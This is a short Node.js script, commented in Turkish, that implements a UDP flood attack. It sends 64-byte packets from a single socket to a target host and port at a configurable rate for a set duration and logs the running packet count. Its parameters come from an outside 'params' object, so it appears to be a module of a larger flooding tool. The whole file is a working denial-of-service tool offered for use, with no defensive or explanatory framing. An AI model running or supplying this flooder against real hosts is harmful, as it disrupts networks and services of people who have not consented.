// udp_flood.js - OPTİMİZE
const dgram = require('dgram');

// Socket havuzu (tek socket yeter)
const client = dgram.createSocket('udp4');
client.unref(); // Node.js'in kapanmasını engelleme

const message = Buffer.from('X'.repeat(64)); // 64 byte'lık paket
const end = Date.now() + (params.duration * 1000);
const target = params.target;
const port = params.port;
const rate = params.requests || 1000; // saniyelik rate

console.log(`[+] UDP Flood: ${target}:${port} - ${params.duration}s`);

let sent = 0;
let lastLog = Date.now();

function flood() {
    if (Date.now() >= end) {
        console.log(`[+] Bitti: ${sent} paket`);
        client.close();
        return;
    }
    
    // Her loop'ta rate/100 kadar paket gönder (100 loop/saniye)
    for (let i = 0; i < rate / 100; i++) {
        client.send(message, port, target, (err) => {
            if (!err) sent++;
        });
    }
    
    // Log her saniye
    if (Date.now() - lastLog > 1000) {
        console.log(`[+] ${sent} paket`);
        lastLog = Date.now();
    }
    
    setImmediate(flood);
}

flood();
